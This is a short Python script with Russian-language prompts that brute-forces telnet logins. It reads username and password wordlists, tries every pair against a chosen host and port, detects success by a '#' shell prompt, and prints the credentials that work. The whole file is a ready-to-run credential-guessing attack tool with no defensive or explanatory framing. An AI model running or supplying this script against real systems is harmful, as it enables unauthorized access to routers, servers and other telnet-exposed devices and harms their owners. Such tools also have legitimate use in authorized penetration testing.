import telnetlib
import re
import time

faled = "Invalid Login."

usersPath = input("Введите путь к файлу с логинами: ")
passwordsPath = input("Введите путь к файлу с паролями: ")
host = input("Введите хост: ")
port = input("Введите порт: ")
faled_ = input("Введите текст неудачи (по умолчанию = Invalid Login.): ")

if faled_:
    faled = faled_

usersFile = open(usersPath,'r')
passwordsFile = open(passwordsPath,'r')

logins = []
passwords = []

logins_ = usersFile.readlines()
for login in logins_:
    logins.append(login.strip())
usersFile.close

paswords_ = passwordsFile.readlines()
for password in paswords_:
    passwords.append(password.strip())
passwordsFile.close

successful = False


for i in range(len(logins)):
    
    if successful:
        break
    
    for j in range(len(passwords)):
        
        tn = telnetlib.Telnet(host, port)

        tn.read_until(b"Username")
        tn.write(logins[i].encode('ascii') + b"\n")
        tn.read_until(b"Password")
        tn.write(passwords[j].encode('ascii') + b"\n")

        regex_idx, match, output = tn.expect([faled.encode('utf-8'), b"#"])

        if (regex_idx == 0):
            time.sleep(3)
            continue
        else:
            successful = True
            print("Пароль подобран")
            print("Login: ", logins[i], " Password: ", passwords[j])
            break

if not successful:
    print("Указанные логины и пароли не верные") 
